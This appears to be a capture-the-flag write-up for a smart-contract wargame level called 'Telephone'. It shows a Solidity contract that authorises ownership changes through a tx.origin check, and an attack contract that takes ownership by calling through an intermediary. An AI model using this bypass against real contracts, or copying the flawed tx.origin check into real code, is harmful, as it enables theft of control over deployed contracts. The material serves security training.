# Challenge 4

 ```solidity
 // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
} 
 ```

Challenge
---

> Claim ownership of the contract below to complete this level.

1. msg.sender - caller of the function.
2. tx.origin - tx.origin is the original sender of a transaction.

Solution
---
1. tx origin attack is like phising attack. here's code to your solution.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneAttack {
    Telephone telephone;

    constructor(address _addr){
        telephone = Telephone(_addr);
    }

    function solveChangeOwner() public {
        telephone.changeOwner(msg.sender);
    }

}
```
2. We made new contract and call the `solveChangeOwner()` so we can claim the owership of the Telephone contract. you can submit the instance and you will pass the test.